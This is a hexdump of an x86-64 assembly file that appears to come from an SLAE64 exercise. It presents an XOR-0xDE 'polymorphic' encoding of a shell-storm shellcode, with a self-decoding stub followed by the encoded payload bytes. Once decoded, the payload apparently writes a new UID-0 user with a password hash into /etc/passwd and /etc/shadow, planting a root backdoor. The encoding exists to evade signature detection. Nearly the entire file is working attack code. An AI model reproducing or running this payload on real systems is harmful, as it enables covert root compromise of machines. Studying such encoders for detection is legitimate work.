00000000  3b 20 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |; ==============|
00000010  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000040  3d 3d 3d 3d 3d 0a 3b 20  22 50 6f 6c 79 6d 6f 72  |=====.; "Polymor|
00000050  70 68 69 63 22 20 76 65  72 73 69 6f 6e 20 6f 66  |phic" version of|
00000060  20 73 68 65 6c 6c 63 6f  64 65 20 61 74 3a 0a 3b  | shellcode at:.;|
00000070  20 68 74 74 70 3a 2f 2f  73 68 65 6c 6c 2d 73 74  | http://shell-st|
00000080  6f 72 6d 2e 6f 72 67 2f  73 68 65 6c 6c 63 6f 64  |orm.org/shellcod|
00000090  65 2f 66 69 6c 65 73 2f  73 68 65 6c 6c 63 6f 64  |e/files/shellcod|
000000a0  65 2d 36 35 38 2e 70 68  70 0a 3b 20 41 75 74 68  |e-658.php.; Auth|
000000b0  6f 72 3a 20 53 4c 41 45  36 34 2d 31 33 35 31 20  |or: SLAE64-1351 |
000000c0  28 4b 65 79 6d 61 6e 29  0a 3b 20 44 61 74 65 3a  |(Keyman).; Date:|
000000d0  20 32 31 2f 30 39 2f 32  30 31 34 0a 3b 0a 3b 20  | 21/09/2014.;.; |
000000e0  4c 65 6e 67 74 68 3a 20  32 37 33 20 62 79 74 65  |Length: 273 byte|
000000f0  73 20 28 67 6f 74 20 73  68 6f 72 74 65 72 20 62  |s (got shorter b|
00000100  79 20 31 31 37 20 62 79  74 65 73 29 0a 3b 0a 3b  |y 117 bytes).;.;|
00000110  20 54 68 65 20 6f 72 69  67 69 6e 61 6c 20 63 6f  | The original co|
00000120  64 65 20 77 61 73 20 6f  70 74 69 6d 69 7a 65 64  |de was optimized|
00000130  2e 20 54 68 69 73 20 77  61 79 20 69 74 20 62 65  |. This way it be|
00000140  63 61 6d 65 20 32 34 30  20 62 79 74 65 73 20 6c  |came 240 bytes l|
00000150  6f 6e 67 2e 0a 3b 20 45  61 63 68 20 62 79 74 65  |ong..; Each byte|
00000160  20 6f 66 20 74 68 65 20  6f 70 74 69 6d 69 7a 65  | of the optimize|
00000170  64 20 73 68 65 6c 6c 63  6f 64 65 20 77 61 73 20  |d shellcode was |
00000180  58 4f 52 27 65 64 20 77  69 74 68 20 30 78 44 45  |XOR'ed with 0xDE|
00000190  2e 20 54 68 65 0a 3b 20  72 65 73 75 6c 74 20 77  |. The.; result w|
000001a0  61 73 20 64 75 6d 70 65  64 20 61 73 20 74 68 65  |as dumped as the|
000001b0  20 65 6e 63 6f 64 65 64  20 73 68 65 6c 6c 63 6f  | encoded shellco|
000001c0  64 65 20 62 65 6c 6f 77  2e 20 41 20 64 65 63 6f  |de below. A deco|
000001d0  64 65 72 20 73 74 75 62  0a 3b 20 77 61 73 20 69  |der stub.; was i|
000001e0  6d 70 6c 65 6d 65 6e 74  65 64 20 74 6f 20 58 4f  |mplemented to XO|
000001f0  52 20 65 61 63 68 20 62  79 74 65 20 6f 66 20 22  |R each byte of "|
00000200  73 68 65 6c 6c 63 6f 64  65 22 20 77 69 74 68 20  |shellcode" with |
00000210  30 78 44 45 2e 20 28 65  78 63 65 70 74 0a 3b 20  |0xDE. (except.; |
00000220  74 68 65 20 66 69 72 73  74 20 62 79 74 65 29 2e  |the first byte).|
00000230  20 41 66 74 65 72 20 74  68 65 20 64 65 63 6f 64  | After the decod|
00000240  69 6e 67 20 69 73 20 66  69 6e 69 73 68 65 64 20  |ing is finished |
00000250  65 78 65 63 75 74 69 6f  6e 20 69 73 0a 3b 20 70  |execution is.; p|
00000260  61 73 73 65 64 20 74 6f  20 74 68 65 20 6f 72 69  |assed to the ori|
00000270  67 69 6e 61 6c 20 28 64  65 63 6f 64 65 64 29 20  |ginal (decoded) |
00000280  73 68 65 6c 6c 63 6f 64  65 2e 0a 3b 0a 3b 20 3d  |shellcode..;.; =|
00000290  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
000002d0  3d 3d 0a 20 0a 73 65 63  74 69 6f 6e 20 2e 74 65  |==. .section .te|
000002e0  78 74 0a 67 6c 6f 62 61  6c 20 5f 73 74 61 72 74  |xt.global _start|
000002f0  0a 20 0a 5f 73 74 61 72  74 3a 0a 20 0a 3b 20 2d  |. ._start:. .; -|
00000300  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000340  2d 2d 0a 3b 20 53 68 65  6c 6c 63 6f 64 65 20 64  |--.; Shellcode d|
00000350  65 63 6f 64 65 72 20 73  74 75 62 0a 3b 20 2d 2d  |ecoder stub.; --|
00000360  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003a0  2d 0a 20 0a 20 20 20 20  70 75 73 68 20 31 0a 20  |-. .    push 1. |
000003b0  20 20 20 70 6f 70 20 72  63 78 0a 62 65 67 69 6e  |   pop rcx.begin|
000003c0  3a 0a 20 20 20 20 63 6d  70 20 72 63 78 2c 20 31  |:.    cmp rcx, 1|
000003d0  0a 20 20 20 20 6a 65 20  62 65 67 69 6e 5f 73 63  |.    je begin_sc|
000003e0  0a 20 20 20 20 70 6f 70  20 72 64 69 20 20 20 20  |.    pop rdi    |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000400  20 20 20 20 20 20 20 20  20 3b 20 72 64 69 20 70  |         ; rdi p|
00000410  6f 69 6e 74 73 20 74 6f  20 74 68 65 20 73 68 65  |oints to the she|
00000420  6c 6c 63 6f 64 65 0a 20  20 20 20 70 75 73 68 20  |llcode.    push |
00000430  62 79 74 65 20 30 78 37  38 0a 20 20 20 20 70 6f  |byte 0x78.    po|
00000440  70 20 72 63 78 0a 20 20  20 20 61 64 64 20 72 63  |p rcx.    add rc|
00000450  78 2c 20 30 78 37 37 0a  64 65 63 6f 64 65 3a 0a  |x, 0x77.decode:.|
00000460  20 20 20 20 78 6f 72 20  62 79 74 65 20 5b 72 64  |    xor byte [rd|
00000470  69 2b 72 63 78 5d 2c 20  30 78 44 45 0a 20 20 20  |i+rcx], 0xDE.   |
00000480  20 6c 6f 6f 70 20 64 65  63 6f 64 65 0a 20 20 20  | loop decode.   |
00000490  20 6a 6d 70 20 73 68 65  6c 6c 63 6f 64 65 0a 20  | jmp shellcode. |
000004a0  0a 62 65 67 69 6e 5f 73  63 3a 0a 20 20 20 20 64  |.begin_sc:.    d|
000004b0  65 63 20 72 63 78 0a 20  20 20 20 63 61 6c 6c 20  |ec rcx.    call |
000004c0  62 65 67 69 6e 0a 20 0a  3b 20 2d 2d 2d 2d 2d 2d  |begin. .; ------|
000004d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000500  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 3b 20  |-------------.; |
00000510  45 6e 63 6f 64 65 64 20  73 68 65 6c 6c 63 6f 64  |Encoded shellcod|
00000520  65 0a 3b 20 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |e.; ------------|
00000530  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000560  2d 2d 2d 2d 2d 2d 2d 0a  20 0a 73 68 65 6c 6c 63  |-------. .shellc|
00000570  6f 64 65 3a 0a 20 20 20  20 73 63 3a 20 64 62 20  |ode:.    sc: db |
00000580  30 78 45 42 2c 20 30 78  42 42 2c 20 30 78 38 31  |0xEB, 0xBB, 0x81|
00000590  2c 20 30 78 35 45 2c 20  30 78 42 31 2c 20 30 78  |, 0x5E, 0xB1, 0x|
000005a0  44 35 2c 20 30 78 39 46  2c 20 30 78 35 45 2c 20  |D5, 0x9F, 0x5E, |
000005b0  30 78 42 31 2c 20 30 78  43 36 2c 20 30 78 39 46  |0xB1, 0xC6, 0x9F|
000005c0  2c 20 30 78 42 34 2c 20  30 78 44 43 2c 20 30 78  |, 0xB4, 0xDC, 0x|
000005d0  38 37 2c 20 30 78 42 34  2c 20 30 78 44 43 2c 20  |87, 0xB4, 0xDC, |
000005e0  30 78 38 36 2c 20 30 78  38 45 2c 20 30 78 38 45  |0x86, 0x8E, 0x8E|
000005f0  2c 20 30 78 38 30 2c 20  30 78 38 34 2c 20 30 78  |, 0x80, 0x84, 0x|
00000600  42 38 2c 20 30 78 35 46  2c 20 30 78 31 38 2c 20  |B8, 0x5F, 0x18, |
00000610  30 78 44 31 2c 20 30 78  44 41 2c 20 30 78 42 38  |0xD1, 0xDA, 0xB8|
00000620  2c 20 30 78 35 46 2c 20  30 78 31 43 2c 20 30 78  |, 0x5F, 0x1C, 0x|
00000630  35 43 2c 20 30 78 44 43  2c 20 30 78 38 46 2c 20  |5C, 0xDC, 0x8F, |
00000640  30 78 44 31 2c 20 30 78  44 42 2c 20 30 78 38 37  |0xD1, 0xDB, 0x87|
00000650  2c 20 30 78 39 37 2c 20  30 78 34 39 2c 20 30 78  |, 0x97, 0x49, 0x|
00000660  39 36 2c 20 30 78 35 44  2c 20 30 78 31 39 2c 20  |96, 0x5D, 0x19, |
00000670  30 78 44 33 2c 20 30 78  33 43 2c 20 30 78 33 44  |0xD3, 0x3C, 0x3D|
00000680  2c 20 30 78 39 36 2c 20  30 78 32 31 2c 20 30 78  |, 0x96, 0x21, 0x|
00000690  31 31 2c 20 30 78 38 39  2c 20 30 78 38 30 2c 20  |11, 0x89, 0x80, |
000006a0  30 78 38 45 2c 20 30 78  38 31 2c 20 30 78 42 34  |0x8E, 0x81, 0xB4|
000006b0  2c 20 30 78 44 43 2c 20  30 78 38 37 2c 20 30 78  |, 0xDC, 0x87, 0x|
000006c0  42 34 2c 20 30 78 46 30  2c 20 30 78 39 46 2c 20  |B4, 0xF0, 0x9F, |
000006d0  30 78 38 30 2c 20 30 78  42 34 2c 20 30 78 44 46  |0x80, 0xB4, 0xDF|
000006e0  2c 20 30 78 38 36 2c 20  30 78 39 46 2c 20 30 78  |, 0x86, 0x9F, 0x|
000006f0  38 38 2c 20 30 78 38 34  2c 20 30 78 38 46 2c 20  |88, 0x84, 0x8F, |
00000700  30 78 44 31 2c 20 30 78  44 42 2c 20 30 78 38 37  |0xD1, 0xDB, 0x87|
00000710  2c 20 30 78 39 36 2c 20  30 78 35 44 2c 20 30 78  |, 0x96, 0x5D, 0x|
00000720  31 38 2c 20 30 78 45 45  2c 20 30 78 39 37 2c 20  |18, 0xEE, 0x97, |
00000730  30 78 35 39 2c 20 30 78  32 31 2c 20 30 78 42 34  |0x59, 0x21, 0xB4|
00000740  2c 20 30 78 45 35 2c 20  30 78 39 46 2c 20 30 78  |, 0xE5, 0x9F, 0x|
00000750  38 30 2c 20 30 78 33 43  2c 20 30 78 33 37 2c 20  |80, 0x3C, 0x37, |
00000760  30 78 42 34 2c 20 30 78  44 43 2c 20 30 78 38 37  |0xB4, 0xDC, 0x87|
00000770  2c 20 30 78 42 34 2c 20  30 78 44 44 2c 20 30 78  |, 0xB4, 0xDD, 0x|
00000780  38 36 2c 20 30 78 38 46  2c 20 30 78 44 31 2c 20  |86, 0x8F, 0xD1, |
00000790  30 78 44 42 2c 20 30 78  38 37 2c 20 30 78 39 37  |0xDB, 0x87, 0x97|
000007a0  2c 20 30 78 35 39 2c 20  30 78 32 31 2c 20 30 78  |, 0x59, 0x21, 0x|
000007b0  33 43 2c 20 30 78 32 41  2c 20 30 78 39 36 2c 20  |3C, 0x2A, 0x96, |
000007c0  30 78 45 46 2c 20 30 78  32 31 2c 20 30 78 42 34  |0xEF, 0x21, 0xB4|
000007d0  2c 20 30 78 45 32 2c 20  30 78 38 36 2c 20 30 78  |, 0xE2, 0x86, 0x|
000007e0  44 31 2c 20 30 78 44 42  2c 20 30 78 33 36 2c 20  |D1, 0xDB, 0x36, |
000007f0  30 78 34 38 2c 20 30 78  32 31 2c 20 30 78 32 31  |0x48, 0x21, 0x21|
00000800  2c 20 30 78 32 31 2c 20  30 78 46 31 2c 20 30 78  |, 0x21, 0xF1, 0x|
00000810  42 42 2c 20 30 78 41 41  2c 20 30 78 42 44 2c 20  |BB, 0xAA, 0xBD, |
00000820  30 78 46 31 2c 20 30 78  41 45 2c 20 30 78 42 46  |0xF1, 0xAE, 0xBF|
00000830  2c 20 30 78 41 44 2c 20  30 78 41 44 2c 20 30 78  |, 0xAD, 0xAD, 0x|
00000840  41 39 2c 20 30 78 42 41  2c 20 30 78 39 46 2c 20  |A9, 0xBA, 0x9F, |
00000850  30 78 46 31 2c 20 30 78  46 31 2c 20 30 78 42 42  |0xF1, 0xF1, 0xBB|
00000860  2c 20 30 78 41 41 2c 20  30 78 42 44 2c 20 30 78  |, 0xAA, 0xBD, 0x|
00000870  46 31 2c 20 30 78 41 44  2c 20 30 78 42 36 2c 20  |F1, 0xAD, 0xB6, |
00000880  30 78 42 46 2c 20 30 78  42 41 2c 20 30 78 42 31  |0xBF, 0xBA, 0xB1|
00000890  2c 20 30 78 41 39 2c 20  30 78 39 46 2c 20 30 78  |, 0xA9, 0x9F, 0x|
000008a0  41 44 2c 20 30 78 42 36  2c 20 30 78 42 42 2c 20  |AD, 0xB6, 0xBB, |
000008b0  30 78 42 32 2c 20 30 78  42 32 2c 20 30 78 46 33  |0xB2, 0xB2, 0xF3|
000008c0  2c 20 30 78 41 44 2c 20  30 78 41 41 2c 20 30 78  |, 0xAD, 0xAA, 0x|
000008d0  42 31 2c 20 30 78 41 43  2c 20 30 78 42 33 2c 20  |B1, 0xAC, 0xB3, |
000008e0  30 78 45 34 2c 20 30 78  41 36 2c 20 30 78 45 34  |0xE4, 0xA6, 0xE4|
000008f0  2c 20 30 78 45 45 2c 20  30 78 45 34 2c 20 30 78  |, 0xEE, 0xE4, 0x|
00000900  45 45 2c 20 30 78 45 34  2c 20 30 78 41 44 2c 20  |EE, 0xE4, 0xAD, |
00000910  30 78 42 36 2c 20 30 78  42 42 2c 20 30 78 42 32  |0xB6, 0xBB, 0xB2|
00000920  2c 20 30 78 42 32 2c 20  30 78 46 33 2c 20 30 78  |, 0xB2, 0xF3, 0x|
00000930  41 44 2c 20 30 78 41 41  2c 20 30 78 42 31 2c 20  |AD, 0xAA, 0xB1, |
00000940  30 78 41 43 2c 20 30 78  42 33 2c 20 30 78 46 30  |0xAC, 0xB3, 0xF0|
00000950  2c 20 30 78 42 31 2c 20  30 78 41 43 2c 20 30 78  |, 0xB1, 0xAC, 0x|
00000960  42 39 2c 20 30 78 45 34  2c 20 30 78 46 31 2c 20  |B9, 0xE4, 0xF1, |
00000970  30 78 45 34 2c 20 30 78  46 31 2c 20 30 78 42 43  |0xE4, 0xF1, 0xBC|
00000980  2c 20 30 78 42 37 2c 20  30 78 42 30 2c 20 30 78  |, 0xB7, 0xB0, 0x|
00000990  46 31 2c 20 30 78 42 43  2c 20 30 78 42 46 2c 20  |F1, 0xBC, 0xBF, |
000009a0  30 78 41 44 2c 20 30 78  42 36 2c 20 30 78 44 34  |0xAD, 0xB6, 0xD4|
000009b0  2c 20 30 78 41 44 2c 20  30 78 42 36 2c 20 30 78  |, 0xAD, 0xB6, 0x|
000009c0  41 44 2c 20 30 78 42 36  2c 20 30 78 42 42 2c 20  |AD, 0xB6, 0xBB, |
000009d0  30 78 42 32 2c 20 30 78  42 32 2c 20 30 78 46 33  |0xB2, 0xB2, 0xF3|
000009e0  2c 20 30 78 41 44 2c 20  30 78 41 41 2c 20 30 78  |, 0xAD, 0xAA, 0x|
000009f0  42 31 2c 20 30 78 41 43  2c 20 30 78 42 33 2c 20  |B1, 0xAC, 0xB3, |
00000a00  30 78 45 34 2c 20 30 78  46 41 2c 20 30 78 45 46  |0xE4, 0xFA, 0xEF|
00000a10  2c 20 30 78 46 41 2c 20  30 78 41 43 2c 20 30 78  |, 0xFA, 0xAC, 0x|
00000a20  42 42 2c 20 30 78 38 39  2c 20 30 78 39 42 2c 20  |BB, 0x89, 0x9B, |
00000a30  30 78 45 39 2c 20 30 78  39 39 2c 20 30 78 39 33  |0xE9, 0x99, 0x93|
00000a40  2c 20 30 78 45 46 2c 20  30 78 46 41 2c 20 30 78  |, 0xEF, 0xFA, 0x|
00000a50  42 46 2c 20 30 78 41 36  2c 20 30 78 42 42 2c 20  |BF, 0xA6, 0xBB, |
00000a60  30 78 39 33 2c 20 30 78  42 39 2c 20 30 78 45 38  |0x93, 0xB9, 0xE8|
00000a70  2c 20 30 78 39 32 2c 20  30 78 38 41 2c 20 30 78  |, 0x92, 0x8A, 0x|
00000a80  41 44 2c 20 30 78 46 31  2c 20 30 78 38 45 2c 20  |AD, 0xF1, 0x8E, |
00000a90  30 78 42 41 2c 20 30 78  38 44 2c 20 30 78 42 39  |0xBA, 0x8D, 0xB9|
00000aa0  2c 20 30 78 42 44 2c 20  30 78 39 38 2c 20 30 78  |, 0xBD, 0x98, 0x|
00000ab0  38 34 2c 20 30 78 45 45  2c 20 30 78 38 42 2c 20  |84, 0xEE, 0x8B, |
00000ac0  30 78 45 44 2c 20 30 78  39 33 2c 20 30 78 46 31  |0xED, 0x93, 0xF1|
00000ad0  2c 20 30 78 45 34 2c 20  30 78 45 46 2c 20 30 78  |, 0xE4, 0xEF, 0x|
00000ae0  45 41 2c 20 30 78 45 39  2c 20 30 78 45 39 2c 20  |EA, 0xE9, 0xE9, |
00000af0  30 78 45 36 2c 20 30 78  45 34 2c 20 30 78 45 34  |0xE6, 0xE4, 0xE4|
00000b00  2c 20 30 78 45 34 2c 20  30 78 45 34 2c 20 30 78  |, 0xE4, 0xE4, 0x|
00000b10  45 34 2c 20 30 78 45 34  2c 20 30 78 44 34        |E4, 0xE4, 0xD4|
00000b1e
